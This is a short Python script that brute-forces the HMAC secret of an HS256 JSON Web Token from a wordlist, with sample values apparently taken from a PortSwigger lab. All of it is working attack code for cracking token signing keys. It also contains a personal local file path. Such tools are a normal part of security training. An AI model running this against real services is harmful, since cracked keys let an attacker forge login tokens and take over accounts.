#!/bin/python3

# Imports
import hmac
import hashlib
import base64


# INPUT EXAMPLES:
# header = b'<JWT-header-without-space>'	
# body = b'<JWT-body-without-space>'
# signature = b'<JWT-signature>'
# alg = '<JWT-signing-algorithm-from-JWT-header>'
# 
# Example:
# header = b'{"kid":"c3af7696-ab04-4d00-9248-03a36bc19175","alg":"HS256"}'
# body = b'{"iss":"portswigger","sub":"wiener","exp":1689002759}'
# signature = b'p3ib8d8RyVNpOArCtf9hgT6UzN5wd9mE-eWJ0Z8D5eo'
# alg = 'HS256'

header = b'{"kid":"c3af7696-ab04-4d00-9248-03a36bc19175","alg":"HS256"}'
body = b'{"iss":"portswigger","sub":"wiener","exp":1689002759}'
signature = b'p3ib8d8RyVNpOArCtf9hgT6UzN5wd9mE-eWJ0Z8D5eo'
alg = 'HS256'

wordlist_path = "C:\\Users\\wb604769\\OneDrive - WBG\\Documents\\Wordlists\\dirb\\wordlists\\test.txt"


# Global Variables
# hardcoded secret for testing
# secret = "secret1"


# Functions
def help():
	print("###################\nJWT Bruteforce\n##################\n.\n.\n.\n")
	
def get_wordlist_handle():
	file = open(wordlist_path)
	return(file)

def verify_hs256(secret):
	eheader = str(base64.urlsafe_b64encode(header), 'utf-8').rstrip('=')
	ebody = str(base64.urlsafe_b64encode(body), 'utf-8').rstrip('=')
	d = eheader + "." + ebody
	sig = str(base64.urlsafe_b64encode(hmac.new(secret, d.encode('utf-8'), hashlib.sha256).digest()), 'utf-8').rstrip('=')
	print(sig)
	
	if (sig == str(signature, 'utf-8')):
		print(".\n.\n.\n\n##############################\n> Secret Found: " + str(secret, 'utf-8') + "\n##############################\n") 		
		return(secret)


# Main
if __name__ == "__main__":
	help()
	
	if (alg == 'HS256'):
		h = get_wordlist_handle()
		while True:
			# read one line from the wordlist
			secret = h.readline().rstrip()
			#print for debug
			#print(secret)
			
			# If signature matches exit loop.
			if (verify_hs256(bytes(secret, 'utf-8'))):
				break

			# if end-of-file, exit loop.
			if not secret:
				break